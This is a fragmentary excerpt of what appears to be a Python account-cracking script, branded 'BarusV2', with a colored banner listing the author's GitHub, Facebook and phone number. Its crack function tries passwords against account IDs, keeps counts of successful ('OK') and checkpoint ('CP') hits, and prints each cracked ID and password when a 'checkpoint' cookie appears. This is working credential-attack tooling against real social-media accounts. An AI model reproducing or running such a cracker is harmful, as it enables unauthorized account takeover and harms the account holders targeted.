...
\33[1;32m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
\33[1;33m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;33m█  \33[mGithub: https://github.com/jepribarus
\33[1;33m█  \33[mFacebook: Jepri Barus
\33[1;33m█  \33[mWhatsApp: 085767354326
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [BarusV2] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					print(f"\33[1;33m╚══[CP BARUS]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
